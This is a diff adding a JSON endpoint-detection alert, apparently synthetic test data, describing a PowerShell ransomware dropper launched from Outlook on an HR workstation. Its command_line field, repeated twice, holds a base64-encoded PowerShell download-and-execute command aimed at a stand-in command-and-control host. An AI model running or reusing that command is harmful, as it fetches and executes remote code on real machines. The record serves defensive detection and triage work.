@@ -1,0 +1,42 @@
+{
+  "alert_id": "EDR-SYSMON-2026-4690",
+  "alert_type": "RANSOMWARE_DETECTION",
+  "timestamp": "2026-09-03T11:44:10.000Z",
+  "event_source": {
+    "agent_name": "Host Sentinel EDR Agent v2.4",
+    "event_id": 4688,
+    "provider": "Microsoft-Windows-Sysmon",
+    "mitre_technique_id": "T1490",
+    "mitre_tactic": "Inhibit System Recovery"
+  },
+  "target_asset": {
+    "hostname": "ws-hr-manager01",
+    "ip_address": "10.0.5.12",
+    "department": "Human Resources",
+    "environment": "CORPORATE_WORKSTATION",
+    "criticality": "MEDIUM",
+    "logged_in_user": "CORP\\hrmanager"
+  },
+  "malware_forensics": {
+    "malware_family": "PowerShell Ransomware Dropper",
+    "process_name": "powershell.exe",
+    "process_id": 7820,
+    "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAaQBjAGkAbwB1AHMALgB4AHkAegAvAGUAeABlACcAKQA=",
+    "parent_process_name": "outlook.exe",
+    "parent_process_id": 3412,
+    "binary_hash_sha256": "8f3b2597b819f7e8b6b23a1a45b7f16f73db139b4b09c2a3e144a6ec7ef10688",
+    "suspicious_extensions": [".encrypted"],
+    "affected_file_count": 95,
+    "encryption_velocity_per_min": 190,
+    "active_sockets": ["tcp:10.0.5.12:54320->103.145.2.44:443 (ESTABLISHED)"]
+  },
+  "hostname": "ws-hr-manager01",
+  "host_ip": "10.0.5.12",
+  "process_name": "powershell.exe",
+  "process_id": 7820,
+  "pid": 7820,
+  "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAaQBjAGkAbwB1AHMALgB4AHkAegAvAGUAeABlACcAKQA=",
+  "suspicious_extensions": [".encrypted"],
+  "affected_file_count": 95,
+  "description": "EDR Sysmon Alert: Malicious Encoded PowerShell spawned from Outlook.exe downloading payload"
+}
